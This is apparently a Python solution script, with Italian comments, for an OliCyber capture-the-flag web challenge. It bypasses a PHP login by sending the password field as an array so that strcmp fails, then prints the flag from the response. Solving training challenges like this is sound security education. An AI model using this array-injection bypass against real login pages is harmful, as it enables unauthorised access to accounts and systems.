import requests

#modificare l'html
"""
<body>
  <div class="log-form">
    <div>
      <a href="/?source">Source code</a><br>
          </div>
    <h2>Login</h2>
    <form method="POST">
      <input type="password" name="password" placeholder="password">
      <button type="submit" class="btn">Login</button>
    </form>
  </div>


</body>

name="password[]"

inserire un vettore, """ 

# https://rst.hashnode.dev/bypassing-php-strcmp per la spiegazione sul fail di strcmp

#con l'html modificato l'exploit è il seguente
url = 'http://clogin.challs.olicyber.it/'
r=requests.post(url, data={"password[]":"vettorepocosimpatico[0]=10"}).text

for line in r.splitlines():
    if "flag{" in line.lower():
        print("flag:\n", line)